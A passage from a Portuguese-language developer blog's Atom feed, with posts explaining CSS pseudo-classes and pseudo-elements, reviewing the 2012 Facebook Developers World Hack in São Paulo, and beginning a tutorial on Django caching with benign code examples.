&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="infraestrutura"></category><category term="web"></category><category term="python"></category><category term="cgi"></category><category term="fastcgi"></category><category term="wsgi"></category><category term="gunicorn"></category></entry><entry><title>As pseudo-classes e os pseudo-elementos</title><link href="https://klauslaube.com.br/2012/09/05/pseudo-classes-e-os-pseudo-elementos.html" rel="alternate"></link><published>2012-09-05T09:42:49-03:00</published><updated>2012-09-05T09:42:49-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-09-05:/2012/09/05/pseudo-classes-e-os-pseudo-elementos.html</id><summary type="html">&lt;p&gt;O &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS"&gt;&lt;em&gt;CSS&lt;/em&gt;&lt;/a&gt; tem diversas coisas legais. Uma quantidade
de propriedades, valores e funcionalidades, que por inúmeras vezes me
fogem da memória. Uma das coisas mais interessantes do &lt;em&gt;CSS&lt;/em&gt;, mas que
geralmente me confunde, são as &lt;strong&gt;pseudo-classes&lt;/strong&gt; e os
&lt;strong&gt;pseudo-elementos&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Então eu resolvi escrever este &lt;em&gt;post&lt;/em&gt;, e nele vou explicar a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS"&gt;&lt;em&gt;CSS&lt;/em&gt;&lt;/a&gt; tem diversas coisas legais. Uma quantidade
de propriedades, valores e funcionalidades, que por inúmeras vezes me
fogem da memória. Uma das coisas mais interessantes do &lt;em&gt;CSS&lt;/em&gt;, mas que
geralmente me confunde, são as &lt;strong&gt;pseudo-classes&lt;/strong&gt; e os
&lt;strong&gt;pseudo-elementos&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Então eu resolvi escrever este &lt;em&gt;post&lt;/em&gt;, e nele vou explicar a diferença e
aplicabilidade dos dois. Espero colaborar com outras mentes tão
preguiçosas na arte da lembrança, quanto a minha :)&lt;/p&gt;
&lt;h2&gt;Pseudo-classes&lt;/h2&gt;
&lt;p&gt;As pseudo-classes são muito úteis para fazermos manipulações
estruturais, ou alterações de estilos de forma dinâmica. Uma forma
interessante de pensarmos sobre pseudo-classes é que o seu resultado
pode ser obtido com &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, através de eventos ou de seletores
(como o &lt;code&gt;:eq&lt;/code&gt;). Com a ajuda deste artifício, conseguimos entregar uma
solução muito simples e funcional. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;menu&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;menu&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;hover&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;red&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veja o exemplo no &lt;a href="http://jsfiddle.net/kplaube/vv7Yu/" title="Exemplo de utilização de pseudo-classes"&gt;&lt;em&gt;jsFiddle&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Na demonstração acima, utilizamos a pseudo-classe &lt;code&gt;:hover&lt;/code&gt; para
alterar a cor do &lt;em&gt;link&lt;/em&gt; de azul para vermelho. O evento “hover” acontece
quando estamos com o mouse sobre o elemento. Outros eventos podem
acontecer, como o &lt;code&gt;:active&lt;/code&gt; (quando pressionamos o botão do mouse
sobre o &lt;em&gt;link&lt;/em&gt;), e &lt;code&gt;:visited&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Outro exemplo muito bom, é se precisássemos que apenas o primeiro item
fosse de cor laranja:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;menu&lt;/span&gt; &lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;first-child&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;orange&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veja o exemplo no &lt;a href="http://jsfiddle.net/kplaube/vv7Yu/3/embedded/result/" title="Exemplo de uso do first-child"&gt;&lt;em&gt;jsFiddle&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Note que o caso poderia ser resolvido adicionando uma classe “first” ao
primeiro elemento da lista, e atribuindo a propriedade &lt;strong&gt;color&lt;/strong&gt; à esta
classe. Mas com o uso de pseudo-classes, é possível economizar todo esse
esforço.&lt;/p&gt;
&lt;h2&gt;Pseudo-elementos&lt;/h2&gt;
&lt;p&gt;Os pseudo-elementos, assim como as pseudo-classes, levam à economia de
esforço, de interpretação de &lt;em&gt;Javascript&lt;/em&gt;, e de elementos
“não-semânticos”. Por exemplo, queremos que a primeira letra de um
parágrafo ganhe destaque:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;L&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;orem ipsum dolor sit amet, consectetur
    adipiscing elit. Pellentesque in scelerisque quam...
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;CSS&lt;/em&gt; ficaria mais ou menos assim:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;font-weight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;bold&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;letter-spacing&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veja exemplo no &lt;a href="http://jsfiddle.net/kplaube/MW5p9/" title="Exemplo com elemento não-semântico"&gt;&lt;em&gt;jsFiddle&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Podemos alcançar o mesmo resultado, sem necessitar do &lt;code&gt;span&lt;/code&gt;, através
do pseudo-elemento &lt;code&gt;first-letter&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="nd"&gt;first-letter&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;font-weight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;bold&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;letter-spacing&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veja o exemplo no &lt;a href="http://jsfiddle.net/kplaube/MW5p9/1/" title="Exemplo com pseudo-elemento"&gt;&lt;em&gt;jsFiddle&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Outros pseudo-elementos interessantes são os clássicos &lt;code&gt;after&lt;/code&gt; e
&lt;code&gt;before&lt;/code&gt;, o &lt;code&gt;first-line&lt;/code&gt; e o &lt;code&gt;selection&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Os pseudo-elementos e pseudo-classes não são nenhum “bicho de sete
cabeças”, e podem economizar preciosas linhas de código (e tempo de
processamento do usuário).&lt;/p&gt;
&lt;p&gt;Quando bater aquela dúvida sobre qual utilizar, lembre-se: Quando o
resultado pode ser obtido através de uma classe, use pseudo-classes;
Quando o resultado pode ser obtido através de elementos não-semânticos,
use pseudo-elementos.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/CSS/Pseudo-classes" title="Página sobre pseudo-classes na MDN"&gt;&lt;em&gt;Mozilla Developer Network: CSS – Pseudo-classes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/CSS/Pseudo-elements" title="Página sobre pseudo-elementos na MDN"&gt;&lt;em&gt;Mozilla Developer Network: CSS – Pseudo-elements&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tableless.com.br/pseudo-classes-css/" title="Artigo no Tableless sobre pseudo-classes no CSS"&gt;&lt;em&gt;Tableless&lt;/em&gt;: Seletor do &lt;em&gt;CSS&lt;/em&gt; – Pseudo-classes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="padroes-web"></category><category term="css3"></category></entry><entry><title>Opinião: Facebook World Hack</title><link href="https://klauslaube.com.br/2012/09/02/opiniao-facebook-world-hack.html" rel="alternate"></link><published>2012-09-02T12:37:10-03:00</published><updated>2012-09-02T12:37:10-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-09-02:/2012/09/02/opiniao-facebook-world-hack.html</id><summary type="html">&lt;p&gt;No dia 30 de agosto de 2012 (sexta-feira), rolou o &lt;a href="http://www.facebook.com/groups/worldhacksp/" title="Página do evento no Facebook"&gt;&lt;em&gt;Facebook Developers World Hack – São Paulo&lt;/em&gt;&lt;/a&gt;,
onde engenheiros do próprio &lt;em&gt;Facebook&lt;/em&gt; deram palestras sobre o
desenvolvimento com a &lt;em&gt;API&lt;/em&gt; social, distribuição e monetização. Após as
palestras houve um &lt;em&gt;Hack Day&lt;/em&gt;, onde os vencedores nas categorias
“Mobile”, “Game”, “Open Graph” e …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No dia 30 de agosto de 2012 (sexta-feira), rolou o &lt;a href="http://www.facebook.com/groups/worldhacksp/" title="Página do evento no Facebook"&gt;&lt;em&gt;Facebook Developers World Hack – São Paulo&lt;/em&gt;&lt;/a&gt;,
onde engenheiros do próprio &lt;em&gt;Facebook&lt;/em&gt; deram palestras sobre o
desenvolvimento com a &lt;em&gt;API&lt;/em&gt; social, distribuição e monetização. Após as
palestras houve um &lt;em&gt;Hack Day&lt;/em&gt;, onde os vencedores nas categorias
“Mobile”, “Game”, “Open Graph” e “Geral” foram premiados com créditos no
&lt;em&gt;Facebook&lt;/em&gt; e na &lt;em&gt;Amazon&lt;/em&gt;, além de &lt;em&gt;smartphones&lt;/em&gt; e &lt;em&gt;tablets&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Um ambiente descontraído, com muita comida, bebida e música. Foi fácil
notar que estávamos cercados de pessoas extremamente criativas. Uma
experiência que vou levar comigo para o resto da vida.&lt;/p&gt;
&lt;h2&gt;Expectativas&lt;/h2&gt;
&lt;p&gt;A palavra &lt;em&gt;Hack&lt;/em&gt;, do jeito que é empregada hoje, me incomoda muito. Para
mim, ela significa algo extraordinário, realizado por pessoas
extraordinárias. Isso influenciou muito a minha expectativa, que era de
encontrar um evento extremamente técnico. Por alguns momentos antes de
ir, pensei se eu estaria à altura do evento, o que aumentou
demasiadamente a minha curiosidade e ansiedade.&lt;/p&gt;
&lt;p&gt;Seria o primeiro “Hack Day” que eu participaria, e isso me provocou um
“bloqueio criativo” tão grande, que cheguei no evento sem nenhuma ideia
do que desenvolver. Achei interessante a experiência de sentar com os
colegas e decidir o que iríamos fazer, mas deveria ter ido com algum
esboço pronto.&lt;/p&gt;
&lt;p&gt;Estava esperando um evento diferente… e foi o que eu encontrei.&lt;/p&gt;
&lt;h2&gt;Resultados&lt;/h2&gt;
&lt;p&gt;O local escolhido para o evento foi muito bom! Fomos submersos em um
ambiente muito agradável. No momento em que &lt;a href="http://www.facebook.com/jamesgpearce" title="Perfil do James no Facebook"&gt;&lt;em&gt;James Pearce&lt;/em&gt;&lt;/a&gt; sobe ao
palco, você já percebe a “vibe” do evento. O cara é um verdadeiro
“showman”, e soube “guiar” o “espetáculo” durante o dia inteiro com
muita irreverência e “jogo de cintura”.&lt;/p&gt;
&lt;p&gt;Uma surpresa muito boa foi a tradução simultânea. Todo o conteúdo
apresentado era em inglês, então, a organização do evento disponibilizou
fones de ouvido com traduções em tempo real para o português. Mesmo o
meu inglês sendo técnico, não houve dificuldade em entender o que os
palestrantes falavam.&lt;/p&gt;
&lt;p&gt;E logo nos primeiros &lt;em&gt;slides&lt;/em&gt;, &lt;em&gt;James&lt;/em&gt; dá um significado para a palavra
“Hack” utilizando o &lt;a href="http://www.wired.com/business/2012/02/zuck-letter/" title="Mark Zuckerberg's Letter to Investors - The Hacker Way"&gt;&lt;em&gt;The Hacker Way&lt;/em&gt;&lt;/a&gt;, bom artigo da &lt;a href="http://www.wired.com" title="Get in-depth coverage of current and future trends in technology"&gt;&lt;em&gt;Wired&lt;/em&gt;&lt;/a&gt;
contendo uma carta de &lt;em&gt;Mark Zuckerberg&lt;/em&gt; aos potenciais investidores.
Neste artigo, &lt;em&gt;Mark&lt;/em&gt; diz que &lt;em&gt;Hacker&lt;/em&gt; é mais do que “invasão”, é
acreditar que algo sempre pode ser melhor. Durante este dia, estávamos
tentando fazer a melhor &lt;em&gt;app&lt;/em&gt; que podíamos, utilizando a integração do
&lt;em&gt;Facebook&lt;/em&gt; da melhor forma que podíamos, e acima de tudo, aprendemos
muito com tudo isso. Dessa forma, não consigo imaginar uma palavra
melhor para traduzir todo esse esforço, que não seja “hackeando”.&lt;/p&gt;
&lt;p&gt;Mas o &lt;em&gt;Facebook Developers World Hack&lt;/em&gt; teve os seus pontos negativos. E
o primeiro de todos foi a &lt;em&gt;wifi&lt;/em&gt;. Em um evento onde você é instigado a
trabalhar com uma &lt;em&gt;API&lt;/em&gt; e servir seus projetos na nuvem, ter problemas
de conexão é extremamente frustrante. Nosso time sentou próximo à equipe
técnica responsável pelo local, e percebemos que eles estavam fazendo o
possível para manter tudo funcional.&lt;/p&gt;
&lt;p&gt;Outro ponto que deixou a desejar foi o conteúdo das palestras. Eu
sinceramente não possuo críticas aos palestrantes, pois meu conhecimento
sobre a &lt;em&gt;API&lt;/em&gt; do &lt;em&gt;Facebook&lt;/em&gt; era muito raso. Mas algumas pessoas mais
experientes expressaram reclamações em relação ao nível básico do
conteúdo apresentado. Estávamos muito empolgados com as palestras sobre
&lt;em&gt;games&lt;/em&gt; e monetização, mas analisando um pouco mais “friamente”, elas
foram consideravelmente frustrantes.&lt;/p&gt;
&lt;h2&gt;Veredicto&lt;/h2&gt;
&lt;p&gt;Eu gostei muito do evento. Aprendi muito e gostei dessa proximidade que
houve com os profissionais que trabalham no &lt;em&gt;Facebook&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Infelizmente, nosso time não conseguiu acabar o projeto em tempo, e não
participamos das premiações. Mas demos boas risadas durante todo o dia,
e descartamos a tensão da competição pelo desafio de tentar realizar
algo audacioso.&lt;/p&gt;
&lt;p&gt;Se você tiver a oportunidade de participar de um &lt;em&gt;World Hack&lt;/em&gt;, eu
aconselho que vá. Sem dúvida, alguma coisa de positiva dá para tirar,
seja do conteúdo, ou da experiência de conviver com pessoas diferentes
durante um dia inteiro.&lt;/p&gt;
&lt;p&gt;Resumindo: eu vi e gostei.&lt;/p&gt;</content><category term="opiniao"></category><category term="facebook"></category><category term="world hack"></category><category term="evento"></category></entry><entry><title>Django e Cache: Uma dupla de alta performance - Parte 2</title><link href="https://klauslaube.com.br/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2.html" rel="alternate"></link><published>2012-07-22T14:33:58-03:00</published><updated>2012-07-22T14:33:58-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-07-22:/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2.html</id><summary type="html">&lt;p&gt;Continuando o &lt;em&gt;post&lt;/em&gt; &lt;a href="https://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html" title="Leia a parte 1 deste artigo"&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance&lt;/a&gt;, vamos
ver na prática como utilizar o &lt;em&gt;framework&lt;/em&gt; de &lt;a href="https://klauslaube.com.br/tag/cache.html" title="Leia mais sobre Cache"&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; do &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Embora eu esteja utilizando o &lt;a href="https://klauslaube.com.br/tag/memcached.html" title="Leia mais sobre Memcached"&gt;&lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt; para escrever estes
artigos, vale ressaltar que a abstração do &lt;em&gt;Django&lt;/em&gt; lhe permite utilizar
a &lt;a href="https://docs.djangoproject.com/en/dev/topics/cache/#using-a-custom-cache-backend" title="Django Documentation - Custom backends"&gt;ferramenta mais apropriada para você&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Diferentes …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;Continuando o &lt;em&gt;post&lt;/em&gt; &lt;a href="https://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html" title="Leia a parte 1 deste artigo"&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance&lt;/a&gt;, vamos
ver na prática como utilizar o &lt;em&gt;framework&lt;/em&gt; de &lt;a href="https://klauslaube.com.br/tag/cache.html" title="Leia mais sobre Cache"&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; do &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Embora eu esteja utilizando o &lt;a href="https://klauslaube.com.br/tag/memcached.html" title="Leia mais sobre Memcached"&gt;&lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt; para escrever estes
artigos, vale ressaltar que a abstração do &lt;em&gt;Django&lt;/em&gt; lhe permite utilizar
a &lt;a href="https://docs.djangoproject.com/en/dev/topics/cache/#using-a-custom-cache-backend" title="Django Documentation - Custom backends"&gt;ferramenta mais apropriada para você&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Diferentes maneiras de “cachear” a aplicação&lt;/h2&gt;
&lt;p&gt;Podemos utilizar a camada de &lt;em&gt;cache&lt;/em&gt; em diferentes pontos da aplicação.
Por exemplo, podemos utilizá-la antes de uma consulta ao banco de dados,
armazenar resultados de operações complexas, armazenar o &lt;em&gt;parsing&lt;/em&gt; de um
&lt;em&gt;template&lt;/em&gt;, etc. Com o esquema de &lt;em&gt;middlewares&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;, podemos ter
essa camada aplicada diretamente ao fluxo de interpretação do
&lt;em&gt;framework&lt;/em&gt;, o que pode reduzir consideravelmente o uso de recursos de
nossa hospedagem, sem mesmo termos alterado código das nossas &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos ver a diferença, e casos de usos, dessas formas de utilização do
&lt;em&gt;cache&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Granular&lt;/h3&gt;
&lt;p&gt;Quando você quer ser “incisivo”, utilizar a &lt;em&gt;API&lt;/em&gt; de forma “granular” é
uma ótima opção.&lt;/p&gt;
&lt;p&gt;Por exemplo, no &lt;a href="http://globoesporte.globo.com" title="A melhor cobertura sobre o Futebol e Outros Esportes, no Brasil e no Mundo"&gt;&lt;em&gt;Globoesporte.com&lt;/em&gt;&lt;/a&gt; nós fazemos algumas consultas a
um &lt;a href="http://virtuoso.openlinksw.com/" title="Conheça o Virtuoso"&gt;banco de dados semântico&lt;/a&gt; para trazer informações de eventos,
jogos e atletas. Como esta consulta é consideravelmente demorada,
utilizamos a &lt;em&gt;API&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; para melhorar os tempos de resposta.
Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.core.cache&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cache&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;jogos_por_edicao&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;edicao_slug&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;jogos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;jogos_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;edicao_slug&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;jogos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;jogos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pega_jogos_da_semantica&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;edicao_slug&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;jogos_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;edicao_slug&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;jogos&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Passamos ao &lt;code&gt;cache.set&lt;/code&gt; uma chave (que deve ser menor que 250
caracteres, e não utilizar caracteres especiais) e um valor. Ele também
aceita um terceiro parâmetro, que é o tempo de vida desta informação em
&lt;em&gt;cache&lt;/em&gt;. Quando omitido, o tempo definido nas configurações do &lt;em&gt;backend&lt;/em&gt;
é utilizado.&lt;/p&gt;
&lt;p&gt;Para remover esta informação do &lt;em&gt;cache&lt;/em&gt;, basta utilizarmos o método
&lt;code&gt;cache.delete&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;jogos_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;edicao_slug&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Você tem a liberdade de fazer &lt;em&gt;caching&lt;/em&gt; de qualquer região da sua
aplicação. Mas é bom tomarmos cuidado para que o gerenciamento desses
pontos não passem a ser um problema. O &lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; pode ser
aplicado em outras camadas da abstração, dispensando (em muitos casos) a
necessidade desse tipo de controle em modelos e &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Template&lt;/h3&gt;
&lt;p&gt;Assim como é possível fazer &lt;em&gt;caching&lt;/em&gt; de forma minuciosa com a &lt;em&gt;API&lt;/em&gt;
acima, é possível fazer um controle muito interessante de &lt;em&gt;cache&lt;/em&gt; com os
&lt;em&gt;templates&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;h4&gt;Prevenindo acesso a disco&lt;/h4&gt;
&lt;p&gt;A cada nova requisição, o &lt;em&gt;Django&lt;/em&gt; carrega o arquivo de &lt;em&gt;template&lt;/em&gt; do
disco, interpreta-o com o contexto, e retorna o seu resultado. Podemos
melhorar um pouquinho este fluxo, sem necessitar do &lt;em&gt;Memcached&lt;/em&gt;, basta
adicionarmos o &lt;code&gt;django.template.loaders.cached.Loader&lt;/code&gt; ao
&lt;code&gt;TEMPLATE_LOADERS&lt;/code&gt; do &lt;code&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;TEMPLATE_LOADERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;django.template.loaders.cached.Loader&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
